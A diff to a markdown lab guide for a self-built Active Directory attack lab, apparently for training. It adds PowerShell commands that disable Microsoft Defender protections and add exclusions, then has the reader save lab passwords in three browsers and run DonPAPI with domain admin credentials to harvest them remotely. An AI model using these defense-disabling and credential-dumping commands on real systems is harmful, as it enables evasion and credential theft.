@@ -218,6 +218,24 @@ This is shown in the next screenshot.
 | ![WS Disable Firewall](img/ws-disable-firewall.jpg) | 
 |------------------------------------------------|
 
+Also, defang AV with the following commands.
+| &#x1FA9F; PowerShell Input | Workstation: WS05 |
+|----------------------------|-------------------|
+```PowerShell
+New-Item -ItemType Directory -Path "C:\DOAZLab" -Force > $null
+Set-MpPreference -ExclusionPath 'c:\users\doadmin'
+Set-MpPreference -ExclusionPath 'c:\DOAZLab'
+Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe"
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -EnableControlledFolderAccess Disabled
+Set-MpPreference -EnableNetworkProtection AuditMode
+Set-MpPreference -Force -MAPSReporting Disabled
+Set-MpPreference -SubmitSamplesConsent NeverSend
+
+```
+
 &#x21E8; *Step Complete, Go to the next step!*
 
 </blockquote></details>
@@ -776,6 +794,104 @@ certipy auth -pfx doadmin.pfx -dc-ip 192.168.2.4
 
 &#x21E8; *Step Complete, Go to the next step!*
 
+On the workstation, WS05, open all three installed browsers and paste the site link below into each browser's address bar. 
 
+| &#x1f30e; URL | Browsers on Workstation WS05 |
+|---------------|----------------------------------|
+```url
+http://testphp.vulnweb.com/login.php
+```
+
+Chrome will probably try and social engineer one of your personal accounts. Click the **Don't sign in** button in the bottom right corner of the open Chrome window.
+
+| ![Chrome Don't Sign In](img/chrome-dont-sign-in.jpg) |
+|------------------------------------------------|
+
+Also click the **Skip** button on the next page.
+
+| ![Chrome Default Skip](img/chrome-default-skip.jpg) |
+|------------------------------------------------|
+
+And also, yeah, click through the **Got it** button regarding Chrome's *Enhanced ad privacy*.
+
+| ![Chrome Enhanced Ad Privacy](img/chrome-enhanced.jpg) |
+|------------------------------------------------|
+
+Finally, drop the URL in all the browser address bars. 
+
+```
+http://testphp.vulnweb.com/login.php
+```
+
+| ![All the Browsers](img/all-the-browsers.jpg) |
+|------------------------------------------------|
+
+Enter the following credentials in the respective browsers. 
+
+Chrome Input:
+- Username: `chromeuser`
+- Password: `chromepass1!`
+
+After inputting username and password values, follow the operations described below and shown in the subsequent screenshot. 
+
+1. Click **Login** button.
+2. Click the circled **key** in the right portion of the address bar.
+3. Click **Save** to retain the credential in the browser.
+
+| ![Chrome Save Pass](img/chrome-save-pass.jpg) |
+|------------------------------------------------|
+
+Firefox:
+- Username: `ffuser`
+- Password: `firefoxpass1!`
+
+Firefox should prompt you to save any credential entered in this form. So, enter the credential and click **Login**.
+
+| ![Firefox Cred Login](img/ff-cred-login.jpg) |
+|------------------------------------------------|
+
+As shown next, you should be prompted to save the credential. Click **Save**. 
+
+| ![Firefox Cred Save](img/ff-cred-save.jpg) |
+|------------------------------------------------|
+
+Edge:
+- Username: `edgeuser`
+- Password: `edgepass1!`
+
+The process for saving the password in Edge is similar. After clicking **Login**, click the ellipsis at the far right of the address bar. You will be prompted to and should click on **Manage Passwords**.
+
+| ![Edge Manage Passwords](img/manage-passwords.jpg) |
+|------------------------------------------------|
+
+After clicking on **Manage Passwords**, you should be prompted to save the `edgeuser` credential entered in this form. 
+
+| ![Edge Save Password Got It](img/edge-save-got-it.jpg) |
+|------------------------------------------------|
+
+
+
+The following command will gather all passwords stored in browsers on the WS05 system at 192.168.2.5.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+
+```bash
+deactivate
+cd /opt/DonPAPI
+source dp-env/bin/activate
+
+donpapi collect -u doadmin -p 'DOLabAdmin1!' -t 192.168.2.5 --domain doazlab.com
+
+```
+
+| ![Edge Save Password Got It](img/browser-cred-extract.jpg) |
+|------------------------------------------------|
+
+
+
+Open a browser and search `stealer logs 101`.
+
+An interesting link: https://www.zerofox.com/blog/an-introduction-to-stealer-logs/
 
 </blockquote></details>
